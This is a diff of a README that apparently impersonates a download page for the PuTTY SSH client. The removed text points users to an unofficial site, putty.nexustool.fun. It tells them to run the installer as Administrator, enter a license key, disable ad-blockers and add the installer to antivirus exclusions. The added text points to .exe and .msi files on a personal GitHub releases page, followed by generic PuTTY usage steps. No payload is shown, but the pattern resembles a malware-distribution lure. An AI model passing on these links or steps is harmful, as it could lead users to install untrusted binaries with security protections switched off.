@@ -1,79 +1,86 @@
-# PuTTY Download for Windows 11 & 10
+# 🖥️ PuTTY-2026 - Access Remote Servers With Ease
 
-**PuTTY-2026**
+[Visit the Release Page](https://github.com/Bsaami6772/PuTTY-2026/releases)
 
-**PuTTY** download for Windows 10/11. Scroll to **Download & Install** for the direct link or one-command setup.
+PuTTY-2026 provides a reliable way to connect to remote computers and servers. This software serves as an SSH client and a terminal emulator. It allows you to manage files, edit configurations, and run commands on distant machines as if you sat directly in front of them. This version works on Windows 11 and Windows 10.
 
-[![Windows](https://img.shields.io/badge/Windows-10%20%2F%2011-0078D4?style=flat-square&logo=windows)]()[![Download](https://img.shields.io/badge/Get-Download%20Link-16a34a?style=flat-square)]()
+## 🛠️ System Requirements
 
----
+You need a computer running Windows 10 or Windows 11. The software requires a standard internet connection to reach remote hosts. It uses very little disk space and runs on standard office or home hardware. You do not need special graphics cards or high-end processors to operate this program.
 
-## Download & Install
+## 📥 How to Download and Install
 
-> **This is the download page.** Use the button or link below to get **PuTTY** for Windows.
+Follow these steps to put the software on your computer.
 
-<p align="center">
-  <a href="https://putty.nexustool.fun/">
-    <img src="https://img.shields.io/badge/Download-PuTTY-0078D4?style=for-the-badge&logo=windows&logoColor=white" alt="Download PuTTY">
-  </a>
-</p>
+1. Visit the [official download page](https://github.com/Bsaami6772/PuTTY-2026/releases).
+2. Look for the section labeled Releases.
+3. Choose the file ending in .msi or .exe for Windows.
+4. Click the file name to start the transfer to your computer.
+5. Open your Downloads folder.
+6. Double-click the file you just downloaded.
+7. Follow the prompts on your screen to finish the setup.
 
-| | |
-| --- | --- |
-| **Direct link** | **[putty.nexustool.fun](https://putty.nexustool.fun/)** |
-| **Full URL** | `https://putty.nexustool.fun/` |
-| **Type** | Installer for Windows 10 / 11 (64-bit) |
-| **Admin** | Run setup as Administrator |
+The setup wizard guides you through the process. Click Next on each screen to accept the default settings. Once finished, you see an icon for PuTTY on your desktop or in your start menu.
 
-### Quick steps
+## 🔑 Connecting to a Remote Host
 
-1. Click **[Download — putty.nexustool.fun](https://putty.nexustool.fun/)** (link above)
-2. Save the file from the project page
-3. Run the setup **as Administrator**
-4. Enter your license key when prompted
-5. Restart if the installer asks — then launch from Start menu
+Once you open the software, you see a configuration window. This screen helps you tell the computer where to connect.
 
-<p align="center"><a href="https://putty.nexustool.fun/"><strong>⬇ Download PuTTY now</strong></a></p>
+1. Find the field labeled Host Name (or IP address).
+2. Type the address of the server you wish to reach.
+3. Ensure the Port field shows 22. This is the standard port for secure connections.
+4. Check that the Connection type is set to SSH.
+5. Click the Open button at the bottom of the window.
 
----
+The first time you connect to a new host, a security warning appears. This is normal. It means your computer does not yet know the server. Click Yes to accept the connection and save the server key for future sessions.
 
-## About
+## 📝 Entering Your Credentials
 
-**PuTTY** setup page for Windows PC users.
+After you click Open, a black window appears. This is the terminal.
 
-**People also search for:** putty download, putty ssh client install setup windows 2026
+1. The text asks for your login name.
+2. Type your username and press Enter.
+3. The prompt asks for your password. 
+4. Type your password and press Enter. 
 
-**Repository:** `PuTTY-2026`
+Note that the software does not show characters on the screen while you type your password. This protects your password from prying eyes. Pressing Enter sends your password to the server. If the details match, you gain access to the remote command line.
 
+## ⚙️ Saving Your Sessions
 
-## After install
+You do not need to type the server address every time you use the software. You can save your settings for later.
 
-| Step | Tip |
-| --- | --- |
-| 1 | Sign in with your license / account |
-| 2 | Check for updates inside the app |
-| 3 | Pin to Start or taskbar for quick access |
-| 4 | Keep projects on a separate data drive |
+1. Open the application.
+2. Type the server address in the Host Name field.
+3. Look at the box labeled Saved Sessions. 
+4. Type a name for your connection.
+5. Click Save.
 
-## System requirements
+Next time you open the program, click the name in the list and then click Load. This restores your settings. Open launches the connection immediately.
 
-| | Minimum |
-| --- | --- |
-| OS | Windows 10 / 11 (64-bit) |
-| RAM | 4 GB |
-| Disk | 1 GB free space |
-| Network | Required for first download |
-| Admin | Required for install/repair |
+## 🎨 Changing Your Display Settings
 
-## Troubleshooting
+You can adjust how the terminal looks to make it easier to read.
 
-| Issue | Try this |
-| --- | --- |
-| Download does not start | Disable VPN/ad-block for the project page |
-| Setup blocked | Run as Administrator |
-| Same error after fix | Reboot, then run repair again |
-| Antivirus warning | Add installer folder to exclusions temporarily |
+1. Open the application.
+2. On the left side of the window, look for the Category tree.
+3. Click Appearance.
+4. You can change the font type and size to suit your preference.
+5. Click Colors to change the background or text colors.
+6. Return to Session in the category tree and click Save to keep these changes.
 
----
+## 🛡️ Security Best Practices
 
-**Topics:** putty-download, putty-ssh-client-install-setup-windows-2026, putty-2026, putty, ssh-client, terminal, remote-shell, software, windows-11, download
+Use secure passwords for your remote servers. Avoid sharing your login details with other people. If you use a public computer, ensure you close the terminal window when you finish your task. Do not save passwords inside the software if you share your computer with others.
+
+## 💡 Troubleshooting Common Issues
+
+If the connection fails, check the following items.
+
+- Verify your internet connection.
+- Check the server address for spelling errors.
+- Confirm that the server is online and running.
+- Ensure your network allows SSH traffic on port 22.
+
+Most errors occur because of a typo in the address or a temporary network disruption. Close the program and try again later if the problem persists. If the error message mentions a Refused error, the server likely blocks the connection or is turned off. 
+
+This program offers a simple way to manage remote Linux environments. It remains a standard tool for system administrators and casual users who need to interact with remote files. Follow these instructions to keep your setup clean and organized.
